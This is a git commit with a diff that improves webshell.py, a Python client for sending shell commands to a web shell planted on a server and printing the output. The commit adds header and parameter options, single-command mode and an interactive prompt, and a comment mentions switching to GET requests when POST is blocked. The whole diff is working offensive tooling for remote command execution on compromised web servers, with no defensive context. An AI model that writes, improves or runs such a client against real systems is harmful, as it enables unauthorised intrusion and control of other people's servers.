c4adb5d2651a55ce094c4758b0aefb64a28f89c0
neuronaddict <dev@lacourarie.org>
2020-12-14 23:21:17 +0100

    Improve webshell
    - Add help
    - add param
    - use cmd for cmd in command line
    - typo + indentation

--- webshell.py
+++ webshell.py
@@ -6,34 +6,44 @@ import sys
 
 
 parser = argparse.ArgumentParser('get a webshell with url, and use <param> as command post param (by default cmd)')
-parser.add_argument('--header', action='append')
-parser.add_argument('--cmd', default='cmd')
+parser.add_argument('--header', action='append', help='add header')
+parser.add_argument('--param', default='cmd', help='param with command to use')
+parser.add_argument('--cmd', help='command to send')
 parser.add_argument('url')
 
 args = parser.parse_args()
 
 url = args.url
+param = args.param
 cmd = args.cmd
 
 
-s = requests.Session()
 
-headers = {}
 
-if args.header:
-	for header in args.header:
-		
-		key = header.split(':')[0]
-		value = header[header.index(': ')+2:]
-		headers[key] = value
 
-while True:
-    c = input('--> ')
-    r = s.post(url, data={cmd: c}, headers=headers)
-    # use this in place of post if you can't make post requests (commands are displayeds in apache logs)
-    #r = s.get(url, params={cmd: c})
+def execute(cmd, headers):
+	
+    r = requests.post(url, data={param: cmd}, headers=headers)
+ 
     print(r.request.url)
     t = r.text
+
     print(t)
+
+
+headers = {}
+if args.header:
+    for header in args.header:
+        key = header.split(':')[0]
+        value = header[header.index(': ')+2:]
+        headers[key] = value
+
+if cmd is not None:
+    execute(cmd, headers)
+else:	
+    while True:
+        c = input('--> ')
+        execute(c, headers)
+    
 
 
